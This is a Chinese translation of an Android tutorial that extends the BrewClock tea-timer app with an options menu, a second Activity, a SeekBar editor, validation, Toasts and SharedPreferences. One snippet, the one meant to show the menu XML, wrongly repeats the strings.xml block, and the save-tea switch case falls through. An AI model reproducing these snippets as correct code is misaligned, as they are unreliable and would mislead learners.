<p>Cursor的getInt()方法带了一个我们想提取的列的下标为参数。在我们的teaData.all()方法中创建游标的时候，我们读取的列是_ID,NAME和BREW_TIME。假设我们在teaSpinner中选择的是Jasmine Tea，那么将返回我们所选数据所对应的数据库记录。</p>
<p>然后我们再通过传递参数2来选择此记录的第二列的整型值。这个值提供给setBrewTime()方法。这个方法用于更新界面上的泡茶时间。</p>
<p>最后，我们需要告诉teaSpinner BrewClockActivity正在监听OnItemSelected事件。在BrewClockActivity的onCreate方法中增加下面的代码：<br>
</p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">// src/com/example/brewclock/BrewClockActivity.java
public void onCreate() {
  // …
  teaSpinner.setOnItemSelectedListener(this);
}
</pre>
<br>
大功告成！再次运行你的程序，并从Spinner选择不同的茶叶。每次你所选的茶叶它所对应的泡茶时间都回显示对应的界面上。我们余下的代码中已经可以处理从当前时间开始递减计数。所以在有预先设置的茶叶种类下，我们已经可以完成我们所想要的功能。
<p>你当然可以，回到之前的代码中去增加一些茶叶种类你满足你的口味。但是如果你发布BrewClock程序到Android Market，每当有人向增加新的茶叶数据到数据库中，我就需要去手动的取更新数据中的内容并重新发布它；这样所有的人就必须去更新它，并且所有的人都有一个同样的列表。这听起来非常的不灵活，因此我们还有很多的工作需要完成！</p>
<p><img alt="image placeholder" ></p>
<p>如果用户自己有方法新增茶叶种类到数据库里面，将会非常的不错的做法。因此我们将在下一章继续。。。</p>
<h3>Activity 介绍</h3>
<p>和你应用程序中每个屏幕关联的代码就是Activity。每次当你从一屏切换到另外一屏，Android就会创建一个新的Activity。在真实世界中，虽然一个应用程序经常由多个屏幕/Activity构成，Andriod却将每个屏幕看作独立的个体。多个Activity工作在一起形成一种关联的体验，这是因为Android让你非常容易地在屏幕/Activity之间传递数据。</p>
<p>在本节最后，你将为你的应用程序新增一个新的Activity（AddTeaActivity）并将它注册到Android系统中。你还需要从最初的BrewClockActivity传递数据到新的Activity中。</p>
<p>首先，我们需要给用户一种方式切换到新的Activity上。我们将使用选项菜单来完成之一步。</p>
<h4>
<span class="ez-toc-section" id="%E9%80%89%E9%A1%B9%E8%8F%9C%E5%8D%95"></span>选项菜单<span class="ez-toc-section-end"></span>
</h4>
<p>当用户他们的设备上的“Menu”按键时，选项菜单以弹出菜单的形式出现。Android负责菜单的自动创建和显示；你只需要告诉Android，菜单显示什么内容和当用户点击菜单时该做什么就行。</p>
<p>然而,最好不要在代码中硬编码菜单的标题，我们可以使用Android的字符串资源。字符串资源是一个独立的文件，在这个文件中你可以维护所有用于用户阅读的字符串和标签资源，并可以在代码调用它们。这就意味着当你在未来需要修改字符串时，你只要修改这一处地方即可。.</p>
<p>在project explorer中导航到“res/values”下，你将会看到string.xml文件已经存在。这个是你再创建新项目的时候由Eclipse创建的，这文件存放着在整个应用程序我们将要使用的字符串。</p>
<p>双击打开<em>strings.xml</em> ,通过窗口底部的选项页切换到XML 视图。</p>
<p>在&lt;resources&gt;…&lt;/resources&gt; 元素中增加下面的内容:<br>
</p>
<pre data-enlighter-language="xml" class="EnlighterJSRAW">
&lt;!-- res/values/strings.xml --&gt;
  &lt;resources&gt;
    &lt;!-- … --&gt;
    &lt;string name="add_tea_label"&gt;Add Tea&lt;/string&gt;
  &lt;/resources&gt;


</pre>
<br>
我们在这里定义了一个字符串，add_tea_label和它关联的文本，我们可以在整个程序代码中通过add_tea_label来使用其关联的文本。如果标签因为某个原因需要修改，我们只需要在这个文件修改这一个地方就能完成整个程序的修改。
<p>下一步，让我们创建一个新文件完成选项菜单的定义，如果字符串和布局一样，菜单也使用XML来定义。因此我们将在Eclipse中川建一个新的XML文件：</p>
<p>通过选择File → New → Other, 并选择“Android XML File.”在Eclipse中创建一个新的XML文件。</p>
<p>选择资源的类型为 “Menu”，保存文件名为main.xml。Eclipse将为你自动的创建一个目录<em>res/menu</em>, 来存放你的菜单文件。</p>
<p><img alt="image placeholder" ></p>
<p>打开<em>res/menus/main.xml</em> 文件, 通过窗口底部的“main.xml”选项页来切换到XML视图。</p>
<p>增加菜单项， add_tea。<br>
</p>
<pre data-enlighter-language="xml" class="EnlighterJSRAW">&lt;!-- res/values/strings.xml --&gt;
  &lt;resources&gt;
    &lt;!-- … --&gt;
    &lt;string name="add_tea_label"&gt;Add Tea&lt;/string&gt;
  &lt;/resources&gt;
</pre>
<br>
注意android:title 属性被设置为@string/add_tea_label。这告诉Android在我们的strings.xml文件中查找add_tea_label并返回相关联的标签内容。在本列中我们的菜单项的标签时“Add Tea”。
<p>下一步，我们将告诉我们的Activity，当用户点击设备上的“memu”按键时来显示这个选项菜单。</p>
<p>返回<em>BrewClockActivity.java</em>代码, 重载onCreateOptionsMenu 方法,这个方法告诉Android 当用户点击“Menu”按键时，装载我们的菜单：<br>
</p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">// src/com/example/brewclock/BrewClockActivity.java
@Override
public boolean onCreateOptionsMenu(Menu menu) {
  MenuInflater inflater = getMenuInflater();
  inflater.inflate(R.menu.main, menu);

  return true;
}

</pre>
<br>
当用户点击他设备上的“Menu”按键时，Android将调用onCreateOptionsMenu。在这个方法中，我们创建了一个MenuInflater, 这个对象将从你的应用程序包中装载你的菜单资源。就如同按钮和文本域组成你的应用程序布局一样，main.xml资源也是通过全局对象R来生效的，因此我们将此对象提交给MenuInflater对象。
<p>为了测试菜单，保存并在模拟器中并运行应用程序。当程序运行起来使，点击“Menu”按键，你将会看到一个弹出式的菜单显示了一个“Add Tea”选项。</p>
<p><img alt="image placeholder" ></p>
<p>如果你点击“Add Tea”选项，Android自动地检测到点击并关闭菜单。在后台，Android将会提醒应用程序选项已经被点击。</p>
<h4>
<span class="ez-toc-section" id="%E5%A4%84%E7%90%86%E8%8F%9C%E5%8D%95%E7%82%B9%E5%87%BB"></span>处理菜单点击<span class="ez-toc-section-end"></span>
</h4>
<p>当用户点击 “Add Tea” 菜单选项，我们想要显示一个新的Activity以便我们能进入增加新茶叶种类的界面。通过选择File → New → Class来创建一个的Activiy。</p>
<p><img alt="image placeholder" ></p>
<p>将新类命名为 AddTeaActivity,并确保它继承于android.app.Activity类。这个类也放在com.example.brewclock包中:<br>
</p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">// src/com/example/brewclock/AddTeaActivity.java
package com.example.brewclock;

import android.app.Activity;
import android.os.Bundle;

public class AddTeaActivity extends Activity {
  @Override
  public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
  }
}

</pre>
<br>
上面样例中的空白Activity将不会完成任何工作。但是通过它，我们已经可以完成选项菜单的功能。
<p>在BrewClockActivity增加一个重载方法onOptionsItemSelected 。当用户点击菜单项时，这个方法被Android调用。 (注意点击的MenuItem为它的接收参数：<br>
</p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">// src/com/example/brewclock/BrewClockActivity.java
@Override
public boolean onOptionsItemSelected(MenuItem item) {
  switch(item.getItemId()) {
    case R.id.add_tea:
      Intent intent = new Intent(this, AddTeaActivity.class);
      startActivity(intent);
      return true;

    default:
      return super.onOptionsItemSelected(item);
  }
}


</pre>
<br>
通过上面的代码，我们告诉Android，当“Add Tea”被点击的时候，我们将要创建一个的Activity；在本教程中，就是AddTeaActivity。然而，不要直接创建这个类的实例，注意我们使用了Intent。Intent有着Android框架的强大特性；他们将Activity绑定在一起来组成应用程序，并允许在他们之间相互传递数据。
<p>Intent的优点甚至让你的应用程序可以使用用户安装的其他的应用程序。例如，当用户要从图库里面显示一张图片，Android自动地给显一个对话框来让用户选择应用程序来显示图片。任何注册为可以处理图片显示的应用程序都会出现在这个对话框的列表中。</p>
<p>Intent功能强大而复杂的主体, 因此它值得你从官方的文档<a href="https://developer.android.com/guide/topics/intents/intents-filters.html">official Android SDK documentation</a>中仔细研究。</p>
<p>让我们运行我们的应用程序，以测试我们的“Add Tea”屏幕。</p>
<p>运行你的项目，按下Menu按键，并点击 “Add Tea.”。</p>
<p>不如你预期的，你并没有看到 “Add Tea” Activity，出现在你面前的是一个Android开发者经常看到的对话框：</p>
<p><img alt="image placeholder" ></p>
<p>虽然我们创建了一个Intent并告诉Android启动我们的AddTeaActivity Activity, 由于我们没有将这个Activity注册到Android系统中，我们的应用程序最终还是crash掉了。系统不知道从哪里去找到我们试图运行的Activity（应该还记得Intent可以启动安装在设备上的任何Activity吧）。让我们在应用程序的mainfest文件来注册这些Acitivity。</p>
<p>打开应用的manifest文件，在Eclipse中的AndroidManifest.xml。通过窗口底部的“AndroidManifest.xml”选项页切换到xml视图</p>
<p>应用程序的mainfest文件是保存你应用程序全局设置和信息的地方。你将会看见里面已经有一个.BrewClockActivity 的Activity声明，并且这个Activity在程序运行的时候启动。</p>
<p>在&lt;application&gt;中, 增加一个 &lt;activity&gt; 节点，描述为“Add Tea”的 Activity. 使用我们早先在strings.xml声明的 add_tea_label字符串作为这个Activity的标题：<br>
</p>
<pre data-enlighter-language="xml" class="EnlighterJSRAW">&lt;!-- AndroidManifest.xml --&gt;
&lt;application …&gt;
  …
  &lt;activity android:name=".AddTeaActivity" android:label="@string/add_tea_label" /&gt;
&lt;/application&gt;
</pre>
<br>
在你再次运行BrewClock保存这个manifest文件。这一次，当你打开菜单并点击“Add Tea,”时Android将会启动AddTeaActivity。按下back按键返回主屏幕。
<p>完成了Activity的关联，下一步我们将要开发一个增加新茶的界面！</p>
<h3>开发茶叶编辑器界面</h3>
<p>开发一个增加茶叶界面和上一个教程中开发的BrewClock主界面是非常相似的。首先要创建一个布局文件，然后在按照下面的讲解添加适合的XML内容。</p>
<p>和主界面开发所有不同的是，你可以使用Android最近改进的Eclipse布局编辑器来开界面。创建一个新的XML文件来定义你的布局。从菜单File → New然后选择 “Android XML File,” 选择 “Layout”类型。并将文件命令为<em>add_tea.xml</em>。</p>
<p><img alt="image placeholder" ></p>
<p>用下面的布局内容替换<em>add_tea.xml</em> 文件的内容：<br>
</p>
<pre data-enlighter-language="xml" class="EnlighterJSRAW">&lt;!-- res/layouts/add_tea.xml --&gt;
&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;LinearLayout
  xmlns:android="http://schemas.android.com/apk/res/android"
  android:layout_width="fill_parent"
  android:layout_height="fill_parent"
  android:orientation="vertical"
  android:padding="10dip"&gt;

  &lt;TextView
    android:text="@string/tea_name_label"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content" /&gt;

  &lt;EditText
    android:id="@+id/tea_name"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"/&gt;

  &lt;TextView
    android:text="@string/brew_time_label"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"/&gt;

  &lt;SeekBar
    android:id="@+id/brew_time_seekbar"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:progress="2"
    android:max="9" /&gt;

  &lt;TextView
    android:id="@+id/brew_time_value"
    android:text="3 m"
    android:textSize="20dip"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:gravity="center_horizontal" /&gt;
&lt;/LinearLayout&gt;

</pre>
<br>
为了这个界面上使用的字符串，我们同样也需要在<em>strings.xml</em> 中增加一些新的内容：<br>
<pre data-enlighter-language="xml" class="EnlighterJSRAW">&lt;!-- res/values/strings.xml --&gt;
&lt;resources&gt;
  &lt;!-- … --&gt;
  &lt;string name="tea_name_label"&gt;Tea Name&lt;/string&gt;

  &lt;string name="brew_time_label"&gt;Brew Time&lt;/string&gt;
&lt;/resources&gt;

</pre>
<br>
在这个布局中，我们加了一个新的界面控件类型，SeekBar。这个控件可以让用户通过从左向右拖拉一个指示器thumb，非常容易的指定泡茶时间。这个值得范围从0到android:max。
<p>在这个界面中，我们使用刻度是0到9，意思是从1分钟到10分钟（泡0分钟茶等于是浪费好茶）。第一，我们需要确保AddTeaActivity能正确地加载我们的界面:</p>
<p>在Activity的onCreate()方法中增加下面的代码用于加载和显示add_tea布局文件：<br>
</p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">// src/com/example/brewclock/AddTeaActivity.java
public void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  setContentView(R.layout.add_tea);
}

</pre>
<br>
现在通过运行项目来测试你的应用程序，按下“Menu”按键，并点击“Add Tea”菜单。
<p><img alt="image placeholder" ></p>
<p>你将从“Add Tea”屏幕上看到你的新界面。你可以在文本域中输入文字和从左到右拖动SeekBar。但是由于我们没有增加相关代码，这个界面并没有实现什么具体的功能。</p>
<p>在AddTeaActivity中增加下面这些属性，并关联到我们界面上元素：<br>
</p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">// src/com/example/brewclock/AddTeaActivity.java
public class AddTeaActivity {
  // …

  /** Properties **/
  protected EditText teaName;
  protected SeekBar brewTimeSeekBar;
  protected TextView brewTimeLabel;

  // …

</pre>
<br>
下一步,关联属性和你的界面：<br>
<pre data-enlighter-language="java" class="EnlighterJSRAW">public void onCreate(Bundle savedInstanceState) {
  // …
  // Connect interface elements to properties
  teaName = (EditText) findViewById(R.id.tea_name);
  brewTimeSeekBar = (SeekBar) findViewById(R.id.brew_time_seekbar);
  brewTimeLabel = (TextView) findViewById(R.id.brew_time_value);
}

</pre>
<br>
界面非常的简单，我们只要增加相应SeekBar 改变事件的监听器。当用户从左到右移动SeekBar指示器时，我们的应用程序需要读出新值并更新SeekBar之下泡茶时间标签的内容。我们将使用一个监听器来检测SeekBar何时改变的：
<p>在AddTeaActivity类声明中增加实现 onSeekBarChangedListener接口，并添加所必要的方法：<br>
</p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">// src/com/example/brewclock/AddTeaActivity.java
public class AddTeaActivity
extends Activity
implements OnSeekBarChangeListener {
  // …

  public void onProgressChanged(SeekBar seekBar, int progress, boolean fromUser) {
    // TODO Detect change in progress
  }

  public void onStartTrackingTouch(SeekBar seekBar) {}

  public void onStopTrackingTouch(SeekBar seekBar) {}
}

</pre>
<br>
我们唯一感兴趣的事件时onProgressChanged，因此我们需要在这个方法内增加代码更新泡茶时间标签的内容为SeekBar选中的值。之前我们说过SeekBar的刻度是0到9，因此我们需要将SeekBar的加1的值来显示给用户才有意义。
<p>在<em>AddTeaActivity.java</em>代码中增加如下的onProgressChanged()代码：<br>
</p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">// src/com/example/brewclock/AddTeaActivity.java
public void onProgressChanged(SeekBar seekBar, int progress, boolean fromUser) {
  if(seekBar == brewTimeSeekBar) {
    // Update the brew time label with the chosen value.
    brewTimeLabel.setText((progress + 1) + " m");
  }
}

</pre>
<br>
在AddTeaActivity的onCreate方法中设置监听器：<br>
<pre data-enlighter-language="java" class="EnlighterJSRAW">// src/com/example/brewclock/AddTeaActivity.java
public void onCreate(Bundle savedInstanceState) {
  // …

  // Setup Listeners
  brewTimeSeekBar.setOnSeekBarChangeListener(this);
}

</pre>
<br>
现在运行你的程序，并拖动SeekBar,泡茶时间标签的内容将会同步更新为正确地值：
<p><img alt="image placeholder" ></p>
<h4>
<span class="ez-toc-section" id="%E4%BF%9D%E5%AD%98%E6%96%B0%E5%A2%9E%E8%8C%B6%E5%8F%B6"></span>保存新增茶叶<span class="ez-toc-section-end"></span>
</h4>
<p>完成了增加茶叶界面之后,剩下的工作就是让用户可以将他们新增的茶叶保存到数据库中.我们将会对界面上输入数据增加一点校验,以避免茶叶名为空的数据被保存到数据库中！</p>
<p>在编辑器中打开<em>strings.xml</em> 增加一些我们在应用程序将要使用到的新标签。<br>
</p>
<pre data-enlighter-language="xml" class="EnlighterJSRAW">&lt;!-- res/values/strings.xml --&gt;
&lt;string name="save_tea_label"&gt;Save Tea&lt;/string&gt;
&lt;string name="invalid_tea_title"&gt;Tea could not be saved.&lt;/string&gt;

&lt;string name="invalid_tea_no_name"&gt;Enter a name for your tea.&lt;/string&gt;


</pre>
<br>
如同前面的那样，我们需要为AddTeaActivity创建一个新的选项菜单来让用户可以执行保存茶叶的指令：
<p>在<em>res/menus</em> 目录，通过选择File → New 并选 Other → Android XML 文件来创建一个新的 <em>add_tea.xml</em> XML文件, 记住资源类型为“Menu”。</p>
<p>增加保存茶叶的菜单项：<br>
</p>
<pre data-enlighter-language="xml" class="EnlighterJSRAW">
&lt;!-- res/menus/add_tea.xml --&gt;
&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;menu xmlns:android="http://schemas.android.com/apk/res/android"&gt;
  &lt;item android:title="@string/save_tea_label" android:id="@+id/save_tea" /&gt;
&lt;/menu&gt;


</pre>
<br>
返回 AddTeaActivity 代码中,类似你在BrewClockActivity中一样，增加重载方法onCreateOptionsMenu 和onOptionsItemSelected。唯一的区别是这次你提供的MenuInflater的资源文件名是<em>add_tea.xml</em> ：<br>
<pre data-enlighter-language="java" class="EnlighterJSRAW">// src/com/example/brewclock/AddTeaActivity.java
@Override
public boolean onCreateOptionsMenu(Menu menu) {
  MenuInflater inflater = getMenuInflater();
  inflater.inflate(R.menu.add_tea, menu);

  return true;
}

@Override
public boolean onOptionsItemSelected(MenuItem item) {
  switch(item.getItemId()) {
    case R.id.save_tea:
      saveTea();

    default:
      return super.onOptionsItemSelected(item);
  }
}

</pre>
<br>
下一步, 增加新方法, saveTea(), 来保存茶叶信息。saveTea 首先从界面上读取茶叶的名称和用户所选的泡茶时间，如果这些输入数据都能通过验证，就将这些数据保存到数据库中：<br>
<pre data-enlighter-language="java" class="EnlighterJSRAW">// src/com/example/brewclock/AddTeaActivity.java
public boolean saveTea() {
  // Read values from the interface
  String teaNameText = teaName.getText().toString();
  int brewTimeValue = brewTimeSeekBar.getProgress() + 1;

  // Validate a name has been entered for the tea
  if(teaNameText.length() &lt; 2) {
    AlertDialog.Builder dialog = new AlertDialog.Builder(this);
    dialog.setTitle(R.string.invalid_tea_title);
    dialog.setMessage(R.string.invalid_tea_no_name);
    dialog.show();

    return false;
  }

  // The tea is valid, so connect to the tea database and insert the tea
  TeaData teaData = new TeaData(this);
  teaData.insert(teaNameText, brewTimeValue);
  teaData.close();

  return true;
}


</pre>
<br>
大段的代码，让我们过一遍这段代码的逻辑。
<p>首先，我们从文本框中读取茶叶名称，从SeekBar读取泡茶时间（记着读的时间要加1以保证时间在1到10分钟之内）。下一步，我们验证茶叶名大于等于2个字符（这是非常简单的验证，如果想做更复杂的验证，那么就使用正则表达式吧）。</p>
<p>如果茶叶名称非法，我们需要让用户知道。我们使用Android提供的工具类，AlertDialog.Biulder类，这个类给我们提供了一个快捷创建和显示模态窗口的方法。在设置完标题和错误信息后，通过调用show方法来显示对话框。这个对话框是模态的modal，因此用户只有按下back按键，这个对话框才会关闭。在这时，我们不想保存任何数据，所以我们的方法返回了false。</p>
<p>如果茶名称合法，我们通过TeaData类创建一个到茶叶数据库的临时连接。这里又一次的显示出把数据库访问抽象成一个独立文件的好处：你可以从任何地方完成对数据库（译者注：其实应该是对TeaData 类）的访问。</p>
<p>当调用完teaData.insert() 来增加记录到数据库后，我们不再需要数据库连接，因此在我们返回成功前，我们关闭了连接。</p>
<p>在模拟器中运行你的程序，按下“Menu”按键，点击屏幕上的“Add Tea”。试图通过在此按下“Menu”和点击屏幕的 “Save Tea.”来保存空茶叶名的茶叶数据。由于是没有茶叶名，一条错误消息将出现在你的面前：</p>
<p><img alt="image placeholder" ></p>
<p>下一步，试着键入你的茶叶名，并选择合适的泡茶时间，再次从菜单选择 “Save Tea” 。这一次，你将不在看到错误的消息。事实上，你什么都看消息不到。</p>
<h4>
<span class="ez-toc-section" id="%E6%94%B9%E8%BF%9B%E7%94%A8%E6%88%B7%E4%BD%93%E9%AA%8C"></span>改进用户体验<span class="ez-toc-section-end"></span>
</h4>
<p>这样做不是一个很好的用户体验，用户不能知道他的茶叶是否已经成功地保存了。事实上，用户只有从“Add Tea”界面返回，去茶叶列表中查看这一个办法来检查他的是否成功的被保存。这样的做法不好，让用户知道他们的茶叶数据被成功地保存会是更好的一种方式。在茶叶数据被成功保存后，让我们在屏幕上显示一条成功信息。</p>
<p>我们要一条被动的非模态化的信息，因此AlertDialog这次就不能满足我们的需求了。下面我们将要使用另外一个Android的非常流行的特性，Toast。</p>
<p>Toast 在接近屏幕的下方显示一条消息，但是并不会终止用户的操作。Toast经常用于做非重要的的提醒和状态更新。.</p>
<p>在<em>strings.xml</em> 资源文件中新增一个字符串。注意字符串中的%s。我们在下一步中将保存的茶叶名字结合到这个字符串来显示信息。<br>
</p>
<pre data-enlighter-language="xml" class="EnlighterJSRAW">&lt;!-- res/values/strings.xml --&gt;
&lt;string name="save_tea_success"&gt;%s tea has been saved.&lt;/string&gt;
</pre>
<br>
注意，在onOptionsItemSelected 代码中进行修改，当saveTea返回真时，创建并显示一条弹出式的Toast。第二参数getString()用来连接茶叶名称到Toast信息中。最后，我们需要将茶叶名称清楚，以便用户可以快速增加更多的新茶。<br>
<pre data-enlighter-language="java" class="EnlighterJSRAW">// src/com/example/brewclock/AddTeaActivity.java
// …
switch(item.getItemId()) {
 case R.id.save_tea:
   if(saveTea()) {
     Toast.makeText(this, getString(R.string.save_tea_success, teaName.getText().toString()), Toast.LENGTH_SHORT).show();
     teaName.setText("");
   }
// …
</pre>
<br>
现在，重新运行应用程序，并增加和保存一些新茶叶。你将会看到弹出式的Toast并让你知道你的茶叶信息已经被保存成功。getString()方法用于连接存在XML文件中的String和茶叶名称，并将%s替换成茶叶的名称。
<p><img alt="image placeholder" ></p>
<p>按下“Back”按键，返回应用程序的主屏幕，点击茶叶spinner。你新增的在数据库中的茶叶已近可以显示在spinner的选项中！</p>
<h3>用户首选项</h3>
<p>现在BrewClock已经完成了所有的功能。用户可以增加他们喜爱的茶叶和各自不同的泡茶时间到数据库中，并且他们可以快速的从选择他们并开始泡上一杯新茶。任何新增的茶叶信息都被保存在数据库中，因此，即使你退出你的程序，这些茶叶信息在你下次启动程序时仍然可以从spinner列表中找到。</p>
<p>当你重启BrewClock的时候，有一件事你必须注意，就是泡茶计数被清为了0。这使得跟踪我们每天喝了多少茶（一条重要的数据）变得困难。作为最后一个练习，让我们将泡茶计数保存在我们设备上。</p>
<p>我们将不通过增加茶叶数据库的表来完成这个功能，我们将使用Android的“共享首选项Shared Preferences”，一个Android提供给你应用程序用于存储简单数据的数据库（字符串，数字，等等）。例如，优秀的最高分和用户首选项等（译者注：非常类似Windows下的注册表）。</p>
<p>我们首先在<em>BrewClockActivity.java</em> 中增加一堆常量。这些常量用于存放你的共享首选项的名称。我们将使用键的名称来访问泡茶计数。Android负责保存和持久化我们的共享首选项文件。<br>
</p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">
// src/com/example/brewclock/BrewClockActivity.java

protected static final String SHARED_PREFS_NAME = "brew_count_preferences";

protected static final String BREW_COUNT_SHARED_PREF = "brew_count";

</pre>
<br>
下一步，为了我们能在用户首选项中读写泡茶计数，而不是直接的依赖于代码中的初始值，我们将在代码中做一些修改。在BrewClockActivity 的 onCreate 方法中我们将就该setBrewCount附件的代码：<br>
<pre data-enlighter-language="java" class="EnlighterJSRAW">// src/com/example/brewclock/BrewClockActivity.java
public void onCreate() {
  // … 

  // Set the initial brew values
  SharedPreferences sharedPreferences = getSharedPreferences(SHARED_PREFS_NAME, MODE_PRIVATE);
  brewCount = sharedPreferences.getInt(BREW_COUNT_SHARED_PREF, 0);
  setBrewCount(brewCount);

  // …
}

</pre>
<br>
这里我们将以使用SharedPreference来获取应用程序的共享首选项的实例，并希望得到brew_count键值的值（通过我们之前定义的BREW_COUNT_SHARED_PREF常量来标示）。如果值能获取，这个值将返回给应用程序，如果没有我们使用getInt的第二参数作为默认值返回（在教程中为0）。
<p>现在我们取得存储的泡茶计数值，我们需要确保每当泡茶计数更新的时候，这个值能写回到共享首选项中。</p>
<p>BrewClockActivity的setBrewCount中增加下面的代码：<br>
</p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">// src/com/example/brewclock/BrewClockActivity.java
 public void setBrewCount(int count) {
   brewCount = count;
   brewCountLabel.setText(String.valueOf(brewCount));

   // Update the brewCount and write the value to the shared preferences.
   SharedPreferences.Editor editor = getSharedPreferences(SHARED_PREFS_NAME, MODE_PRIVATE).edit();
   editor.putInt(BREW_COUNT_SHARED_PREF, brewCount);
   editor.commit();
 }


</pre>
<br>
共享首选项不能直接地保存。我们需要使用Android的SharedPreferences.Editor类。调用SharedPreferences的edit方法，返回一个editor实例，这个实例用来保存我们的首选项值。我们只要调用editor实例的commit方法就可以将值保存到共享首选项中。
<p>我们应用程序的所有代码都已完成，现在让我们测试一下我们的程序！</p>
<p>在模拟器中运行应用程序，定一个泡茶时间（这真是一个良好的借口去泡一杯你自己爱喝的茶哦）并退出应用程序，试着运行模拟器上的安装的其他应用程序确保BrewClock被终止。记住，除非这个应用程序已经不在内存中，否则Android不会终止一个Activity。</p>
<p>当你下一次运行你的应用程序时，你将看见之前的泡茶计数已经被维护了。</p>
<h3>总结</h3>
<p>恭喜!你已经完成了这个应用的程序的所有开发工作,并使用了Android　SDK中的数个核心组件。在本教程中，你从中学到了：</p>
<ul>
<li>创建一个简单的SQLite数据库，并保存你的数据；</li>
<li>使用Android的数据库类和编写客户化类抽象数据访问；</li>
<li>在你的应用程序中增加选项菜单。；</li>
<li>在你应用程序中创建并注册新Activity并使用Intent将他们绑定成一组界面；</li>
<li>使用内建的“共享首选项”数据库来保存和提取简单用户数据。</li>
</ul>
<p>无论你要开发神马样类型的应用程序，数据存储和持久化是一个重要的主题。从工具程序和业务工具到3-D游戏，几乎每个应用程序都需要使用到Android提供的数据工具类。</p>
<p><img alt="image placeholder" ></p>
<h4>
<span class="ez-toc-section" id="Activities"></span>Activities<span class="ez-toc-section-end"></span>
</h4>
<p>虽然BrewClock现在在某方面来说已经是个功能完善的应用程序了。但是我们仍然可以在增加一些功能以改进用户体验。例如你可以使用下面的方法来改进你的应用程序：</p>
<ul>
<li>在保存茶叶的时候检查是否存在茶叶名称重名；</li>
<li>增加一个菜单选项以将泡茶统计清0；</li>
<li>在共享首选项中保存最后所选的泡茶名称和时间以便程序重启时有一个有意义的默认值；</li>
<li>增加用户从茶叶数据库中删除记录的选项。</li>
</ul>
<p>在<a href="https://github.com/cblunt/BrewClock">GitHub库</a> 可以获取到所有的源代码，库中的未来的分支包含着Activitiy的解决方案 你可以通过切换你的本地代码拷贝到tutorial_2分支，下载这个开发教程源代码：<br>
[code]</p>
<p>$ git clone git://github.com/cblunt/BrewClock.git</p>
<p>$ cd BrewClock</p>
<p>$ git checkout tutorial_2</p>
<p>[/code]<br>
我希望你喜欢这个教程，希望这个教程能帮助你设计和开发更棒的Android应用程序。请通过在下面的回复让我知道你的建议和意见，当然我也欢迎你将你建议写在email中并发送给我。</p>
<p><em>感谢<a href="http://blog.anselmbradford.com/">Anselm</a>的建议和反馈！ </em></p>
<p><em>（全文完）</em></p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/4270.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4270.html" class="wp_rp_title">Eclipse开发Android应用程序入门</a>
</li>
<li>
<a href="https://coolshell.cn/articles/17066.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/17066.html" class="wp_rp_title">关于移动端的钓鱼式攻击</a>
</li>
<li>
<a href="https://coolshell.cn/articles/12225.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/12225.html" class="wp_rp_title">DHH 谈混合移动应用开发</a>
</li>
<li>
<a href="https://coolshell.cn/articles/12136.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/12136.html" class="wp_rp_title">Google Inbox如何跨平台重用代码？</a>
</li>
<li>
<a href="https://coolshell.cn/articles/4220.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4220.html" class="wp_rp_title">一些有意思的文章和资源</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3589.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3589.html" class="wp_rp_title">食客还是大厨</a>
</li>
</ul>
</div></div>
<div id="post-ratings-4334" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="ecf23e07bc">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>11</strong> 人打了分，平均分： <strong>3.36</strong> )<br><span class="post-ratings-text" id="ratings_4334_text"></span><meta itemprop="name" content="Eclipse开发Android应用程序入门:重装上阵">
<meta itemprop="headline" content="Eclipse开发Android应用程序入门:重装上阵">
<meta itemprop="description" content="翻译:赵锟
原文：http://www.smashingmagazine.com/2011/03/28/get-started-developing-for-android-with-eclipse-reloaded/

在我们教程系列的第一部分中，我们使用Android和Eclipse开发了一个简单的饮茶计时器的应用程序。在第二部分，我们将继续开发这个程序，并给它增加一些其他的额外的功能。...">
<meta itemprop="datePublished" content="2011-04-08T08:30:09+08:00">
<meta itemprop="dateModified" content="2011-04-08T11:30:06+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/4334.html">
<meta itemprop="author" content="Neo">
